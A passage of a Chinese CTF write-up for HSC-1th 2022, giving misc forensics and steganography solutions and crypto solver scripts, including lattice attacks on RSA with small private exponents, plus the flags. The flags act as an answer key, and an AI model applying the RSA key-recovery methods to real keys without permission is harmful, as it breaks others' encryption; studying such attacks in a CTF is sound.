    <content type="html"><![CDATA[<p>​    </p><p>本届HSC1th 2022是由社会战队红客突击队（Honker Security Commando）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖web，crypto，misc，re等主流方向，并面向全球开放。比赛三甲可获突击队周边礼品。</p><p>Rank: 2</p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign-in"></a>Sign-in</h3><blockquote><p>前往红客突击队公众号发送“HSC2019”并签到吧！</p></blockquote><p>公众号签到。</p><p>flag{HSC_W3LC0M3}</p><p>​    </p><h3 id="DORAEMON"><a href="#DORAEMON" class="headerlink" title="DORAEMON"></a>DORAEMON</h3><p>zip压缩包注释 <code>哆啦A梦把泡好的QR放进口袋后，用六位数字把自己放好了。你能找到它吗？</code>，爆破得到密码 <code>376852</code>；</p><p>得到png图片用16进制修改器修改高度，得到缺少两个定位图案的二维码；</p><p>修复上方两个定位图案，扫描得flag：flag{sing1emak3r10v3m!sc}</p><p>​    </p><h3 id="汝闻-人言否"><a href="#汝闻-人言否" class="headerlink" title="汝闻,人言否"></a>汝闻,人言否</h3><p>png文件后存在zip压缩包，提取后在16进制查看器下修复压缩包，将两处 <code>4B 50</code> 修改为 <code>50 4B</code>；</p><p>发现zip压缩包加密，注释 <code>qazsedcftrfvgycft6yhntgbnytfvbhyik,.;p</code> 为键盘密码，在键盘上画出六个字母 <code>WVALOU</code> 为解压密码，得到 <code>flag</code> 文件，16进制查看发现为wav文件结构；</p><p>使用audacity查看wav文件，在频谱图发现flag：<code>flag:e5353bb7b57578bd4da1c898a8e2d767</code></p><p>​    </p><h3 id="PERFORMANCE-ART"><a href="#PERFORMANCE-ART" class="headerlink" title="PERFORMANCE-ART"></a>PERFORMANCE-ART</h3><p>两种图形替换密码的混合，其中一种为标准银河字母（Standard Galactic Alphabet），猜测另一种代表数字，根据形状和出现概率，猜测出前几位 <code>504B0304140000000</code>，为zip压缩包文件头。</p><p>依次还原所有字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">504b03041400000008004a7e7253148e1e</span><br><span class="line">1e160000001400000006000000756e6b6e6</span><br><span class="line">f778bcaadc888322ec9f30b752df70c</span><br><span class="line">cfae8cca72b30400504b01021f0014000</span><br><span class="line">00008004a7e7253148e1e1e16000000140</span><br><span class="line">000000600240000000000000020000000000</span><br><span class="line">00000756e6b6e6f770a002000000000000</span><br><span class="line">1001800778284ef50dcd7016b04efef5</span><br><span class="line">0dcd701e1b0ef144fdcd701504b05060</span><br><span class="line">000000001000100580000003a0000000000</span><br></pre></td></tr></table></figure><p>保存为zip文件，打开得到内容 <code>ZmxhZ3tnNUEwIWkyZjF9</code>，base64解码得flag：flag{g5A0!i2f1}</p><p>​    </p><h3 id="WIRESHARK"><a href="#WIRESHARK" class="headerlink" title="WIRESHARK"></a>WIRESHARK</h3><p>zip压缩包后存在png图片，提取后使用zsteg查看LSB隐写，在 <code>b1,rgb,lsb,xy</code> 通道隐写了一张png图片，提取：</p><p><code>zsteg -E &quot;b1,rgb,lsb,xy&quot; Untitled1.png &gt; out.png</code></p><p>是一张二维码，扫描得到内容 <code>wrsak..iehr370</code>，栅栏解密 <code>wireshark3.7.0</code>；</p><p>解压最开始的zip压缩包得到 <code>wireshark</code>，16进制查看发现为pdf文件结构，文件头被修改过，还原为 <code>%PDF</code> （<code>25 50 44 46</code>）正常打开，内容无有用信息，猜想为PDF隐写；</p><p>使用wbStego工具从pdf文件成功提取出flag：flag{Go0dJ0B_y0ufIndLt}</p><p>​    </p><h3 id="PCXP"><a href="#PCXP" class="headerlink" title="PCXP"></a>PCXP</h3><blockquote><p>百度网盘<a href="https://pan.baidu.com/s/12q5ULEp_RD62MwbV5eE11A">https://pan.baidu.com/s/12q5ULEp_RD62MwbV5eE11A</a> 提取码：1qih </p><p>奶牛快传<a href="https://cowtransfer.com/s/b76470ddc9e04a">https://cowtransfer.com/s/b76470ddc9e04a</a> </p><p>蓝奏云<a href="https://wwo.lanzouy.com/b030r1x4j">https://wwo.lanzouy.com/b030r1x4j</a> 密码:cvi0 </p><p>本题目文件PCXP1与PCXP2均需要下载！ </p><p>本题文件中flag{raw_Imfig3_mLs3}属于干扰项</p></blockquote><p>两个dump内存的raw文件，用volatility分析。</p><p>其中一个发现 <code>ffflaaagggg.rar</code> 文件：</p><p><code>0x000000000227db70      1      0 R--rwd \Device\HarddiskVolume1\Documents and Settings\Administrator\My Documents\My Music\ffflaaagggg.rar</code></p><p>根据提示，另一个发现 <code>mirror.rar</code> 文件：</p><p><code>0x00000000021221e0      1      0 R--rwd \Device\HarddiskVolume1\Documents and Settings\Administrator\My Documents\My Music\mirror.rar</code></p><p>分别dumpfiles，按注释<code>key:mirror</code> 解压 <code>mirror.rar</code>，提取 <code>mirror.png</code>，发现后半部分有反转的png，reverse处理得到png内有密码 <code>HSC-1th202248H</code> ；</p><p>用密码解压 <code>ffflaaagggg.rar</code>，得到 <code>secret.pcap</code>，用tshark提取USB流量无结果；</p><p>查看16进制发现存在PNG文件头，用foremost提取出两张png图片，画面相同大小不同，猜测为盲水印隐写；</p><p>使用BlindWaterMark工具提取：</p><p><code>python3 bwmforpy3.py decode 00000030.png 00000094.png out.png</code></p><p>得到flag：flag{Wat3rMarkPtysc}</p><p><img src="/2022/02/20/match-HSC-1th-2022/outx.png" alt="outx"></p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Easy-SignIn"><a href="#Easy-SignIn" class="headerlink" title="Easy SignIn"></a>Easy SignIn</h3><blockquote><p>5445705857464579517A4A48546A4A455231645457464243566B5579556C7053546C4A4E524564565646644D515670455130354C5755644F5231685256314A5452315A5552304E57576C5A49525430395054303950513D3D</p></blockquote><p>ciphey一把梭，flag：flag{welc0me_to_my_s1gn_in}</p><p>​    </p><h3 id="AFFINE"><a href="#AFFINE" class="headerlink" title="AFFINE"></a>AFFINE</h3><blockquote><p>flag{md5(result)}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">letter=string.ascii_letters+string.digits</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m, c, a, b</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        ch=m[i]</span><br><span class="line">        t=(letter.index(ch) * a + b) % <span class="number">62</span></span><br><span class="line">        c.append(letter[t])</span><br><span class="line">    d = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">    <span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">m = </span><br><span class="line">c = []</span><br><span class="line">a = </span><br><span class="line">b = </span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (<span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;加密后的密文为：&quot;</span>)</span><br><span class="line">Cipher = encrypt(m, c, a, b)</span><br><span class="line">flag = hashlib.md5(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(m)).encode(<span class="string">&quot;utf8&quot;</span>)).hexdigest()</span><br><span class="line"><span class="comment">#print(flag)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">加密后的密文为：</span></span><br><span class="line"><span class="string">xGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>仿射密码加密，先根据密文和明文，爆破各位置存在 <code>flag</code> 字符串情况下对应的 <code>a,b</code> 值，再解密整串密文。</p><p>爆破求 <code>a,b</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">letter=string.ascii_letters+string.digits</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m, a, b</span>):</span></span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        ch=m[i]</span><br><span class="line">        t=(letter.index(ch) * a + b) % <span class="number">62</span></span><br><span class="line">        c.append(letter[t])</span><br><span class="line">    d = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;xGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv&#x27;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">        Cipher = encrypt(<span class="string">&#x27;flag&#x27;</span>, a, b)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)-<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> Cipher==s[k:k+<span class="number">4</span>]:</span><br><span class="line">                <span class="built_in">print</span>(Cipher,a,b)</span><br><span class="line"><span class="comment"># korv 11 17</span></span><br></pre></td></tr></table></figure><p>解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">11</span></span><br><span class="line">b=<span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">m, a, b</span>):</span></span><br><span class="line">    <span class="keyword">import</span> gmpy2</span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        ch=m[i]</span><br><span class="line">        t=((letter.index(ch) - b) * gmpy2.invert(a,<span class="number">62</span>)) % <span class="number">62</span></span><br><span class="line">        c.append(letter[t])</span><br><span class="line">    d = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">m=decrypt(s, a, b)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">flag = hashlib.md5(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(m)).encode(<span class="string">&quot;utf8&quot;</span>)).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># Oh62Affine1sSti1lN0tSecureEnoughToProtectflag</span></span><br><span class="line"><span class="comment"># 2b9b99caae1cc49e5b5aacbc8cc22350</span></span><br></pre></td></tr></table></figure><p>flag：flag{2b9b99caae1cc49e5b5aacbc8cc22350}</p><p>​    </p><h3 id="LINE-GENERATION-TEST"><a href="#LINE-GENERATION-TEST" class="headerlink" title="LINE-GENERATION-TEST"></a>LINE-GENERATION-TEST</h3><blockquote><p>“Sorry, Tazmi, I can’t hold you in my arms anymore” Who said that? flag{md5(result)}</p><p><img src="/2022/02/20/match-HSC-1th-2022/task.png" alt="task" style="zoom:80%;"></p></blockquote><p>根据 <code>enc</code> 结果，猜测为 $\mod 26$ 下的矩阵运算，值对应字母序，简单用z3解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f=[Int(<span class="string">f&#x27;f<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">out=[<span class="number">9</span>,<span class="number">23</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">19</span>]</span><br><span class="line"></span><br><span class="line">ss=Solver()</span><br><span class="line"></span><br><span class="line">ss.add((f[<span class="number">0</span>]+f[<span class="number">1</span>])%<span class="number">26</span>==out[<span class="number">0</span>])</span><br><span class="line">ss.add((f[<span class="number">1</span>]+f[<span class="number">4</span>])%<span class="number">26</span>==out[<span class="number">1</span>])</span><br><span class="line">ss.add((f[<span class="number">2</span>]+f[<span class="number">3</span>]+f[<span class="number">4</span>])%<span class="number">26</span>==out[<span class="number">2</span>])</span><br><span class="line">ss.add((f[<span class="number">1</span>]+f[<span class="number">2</span>]+f[<span class="number">3</span>])%<span class="number">26</span>==out[<span class="number">3</span>])</span><br><span class="line">ss.add((f[<span class="number">3</span>])%<span class="number">26</span>==out[<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    ss.add(f[i]&gt;=<span class="number">0</span>)</span><br><span class="line">    ss.add(f[i]&lt;<span class="number">26</span>)</span><br><span class="line"></span><br><span class="line">ss.check()</span><br><span class="line">m=ss.model()</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    res+=<span class="built_in">chr</span>(m[f[i]].as_long()+<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># RSCTF</span></span><br></pre></td></tr></table></figure><p>MD5，得flag：flag{e4163deba70420c58acb87abcab34141}</p><p>​    </p><h3 id="LATTICE"><a href="#LATTICE" class="headerlink" title="LATTICE"></a>LATTICE</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;******&#125;&#x27;</span>.strip(<span class="string">b&#x27;flag&#123;&#x27;</span>).strip(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">_length = <span class="built_in">len</span>(flag)</span><br><span class="line">f1, f2, f3 = [flag[_*_length//<span class="number">3</span>:(_+<span class="number">1</span>)*_length//<span class="number">3</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part1</span></span><br><span class="line">m1 = bytes_to_long(f1)</span><br><span class="line">p1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">q1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">n1 = p1 * q1</span><br><span class="line">phi1 = n1 - p1 - q1 + <span class="number">1</span></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, n1)</span><br><span class="line">e1 = invert(getPrime(<span class="number">730</span>), phi1)</span><br><span class="line">e2 = invert(getPrime(<span class="number">730</span>), phi1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c1=<span class="subst">&#123;c1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n1=<span class="subst">&#123;n1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e1, e2=<span class="subst">&#123;e1&#125;</span>, <span class="subst">&#123;e2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># c1=...</span></span><br><span class="line"><span class="comment"># n1=...</span></span><br><span class="line"><span class="comment"># e1, e2=...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part2</span></span><br><span class="line">m2 = bytes_to_long(f2)</span><br><span class="line">p2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">q2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">n2 = p2 * q2</span><br><span class="line">phi2 = n2 - p2 - q2 + <span class="number">1</span></span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e, n2)</span><br><span class="line">e1 = invert(getPrime(<span class="number">818</span>), phi2)</span><br><span class="line">e2 = invert(getPrime(<span class="number">818</span>), phi2)</span><br><span class="line">e3 = invert(getPrime(<span class="number">818</span>), phi2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c2=<span class="subst">&#123;c2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n2=<span class="subst">&#123;n2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e1, e2, e3=<span class="subst">&#123;e1&#125;</span>, <span class="subst">&#123;e2&#125;</span>, <span class="subst">&#123;e3&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># c2=...</span></span><br><span class="line"><span class="comment"># n2=...</span></span><br><span class="line"><span class="comment"># e1, e2, e3=...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part3</span></span><br><span class="line">m3 = bytes_to_long(f3)</span><br><span class="line">nl = []</span><br><span class="line">cl = []</span><br><span class="line">el = []</span><br><span class="line">d = getPrime(<span class="number">890</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    p3 = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q3 = getPrime(<span class="number">1024</span>)</span><br><span class="line">    n3 = p3 * q3</span><br><span class="line">    phi3 = n3 - p3 - q3 + <span class="number">1</span></span><br><span class="line">    e3 = invert(d, phi3)</span><br><span class="line">    c3 = <span class="built_in">pow</span>(m3, e3, n3)</span><br><span class="line">    nl.append(n3)</span><br><span class="line">    el.append(<span class="built_in">int</span>(e3))</span><br><span class="line">    cl.append(<span class="built_in">int</span>(c3))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;nl=<span class="subst">&#123;nl&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;el=<span class="subst">&#123;el&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cl=<span class="subst">&#123;cl&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># nl=[...]</span></span><br><span class="line"><span class="comment"># el=[...]</span></span><br><span class="line"><span class="comment"># cl=[...]</span></span><br></pre></td></tr></table></figure></blockquote><p>RSA的两种涉及格的LLL算法的攻击情形（多组低解密指数攻击+共私钥指数攻击）。</p><p>Part1，2组 $e$ 的低解密指数攻击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">N = </span><br><span class="line">e1 = </span><br><span class="line">e2 = </span><br><span class="line">c = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    alpha2 = i/<span class="number">1000</span></span><br><span class="line">    M1 = <span class="built_in">int</span>(gmpy2.mpz(N)**<span class="number">0.5</span>)</span><br><span class="line">    M2 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">1</span>+alpha2) )</span><br><span class="line">    D = diagonal_matrix(ZZ, [N, M1, M2, <span class="number">1</span>])</span><br><span class="line">    B = Matrix(ZZ, [ [<span class="number">1</span>, -N,   <span class="number">0</span>,  N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>, e1, -e1, -e1*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,  e2, -e2*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>, e1*e2] ]) * D</span><br><span class="line">    L = B.LLL()</span><br><span class="line">    v = Matrix(ZZ, L[<span class="number">0</span>])</span><br><span class="line">    x = v * B**(-<span class="number">1</span>)</span><br><span class="line">    phi = (x[<span class="number">0</span>,<span class="number">1</span>]/x[<span class="number">0</span>,<span class="number">0</span>]*e1).floor()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = inverse_mod(<span class="number">65537</span>, phi)</span><br><span class="line">        m = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(power_mod(c, d, N))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(m)&lt;<span class="number">20</span>:</span><br><span class="line">            <span class="built_in">print</span>(m)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># b&#x27;89c63fd5-00c&#x27;</span></span><br></pre></td></tr></table></figure><p>Part2，3组 $e$ 的低解密指数攻击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">N = </span><br><span class="line">e1 = </span><br><span class="line">e2 = </span><br><span class="line">e3 = </span><br><span class="line">c = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    alpha2 = i/<span class="number">1000</span></span><br><span class="line">    M1 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">3.</span>/<span class="number">2</span>))</span><br><span class="line">    M2 = <span class="built_in">int</span>( gmpy2.mpz(N) )</span><br><span class="line">    M3 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">3.</span>/<span class="number">2</span> + alpha2))</span><br><span class="line">    M4 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">0.5</span>) )</span><br><span class="line">    M5 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">3.</span>/<span class="number">2</span> + alpha2) )</span><br><span class="line">    M6 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">1.</span>+alpha2) )</span><br><span class="line">    M7 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">1.</span>+alpha2) )</span><br><span class="line">    D = diagonal_matrix(ZZ, [M1, M2, M3, M4, M5, M6, M7, <span class="number">1</span>])</span><br><span class="line">    B = Matrix(ZZ, [ [<span class="number">1</span>, -N,   <span class="number">0</span>,  N**<span class="number">2</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,    -N**<span class="number">3</span>],</span><br><span class="line">                 [<span class="number">0</span>, e1, -e1, -e1*N, -e1,      <span class="number">0</span>,   e1*N,  e1*N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,  e2, -e2*N,   <span class="number">0</span>,   e2*N,      <span class="number">0</span>,  e2*N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>, e1*e2,   <span class="number">0</span>, -e1*e2, -e1*e2, -e1*e2*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,  e3,  -e3*N,  -e3*N,  e3*N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,  e1*e3,      <span class="number">0</span>, -e1*e3*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,  e2*e3, -e2*e3*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>, e1*e2*e3] ]) * D</span><br><span class="line">    L = B.LLL()</span><br><span class="line">    v = Matrix(ZZ, L[<span class="number">0</span>])</span><br><span class="line">    x = v * B**(-<span class="number">1</span>)</span><br><span class="line">    phi_ = (e1*x[<span 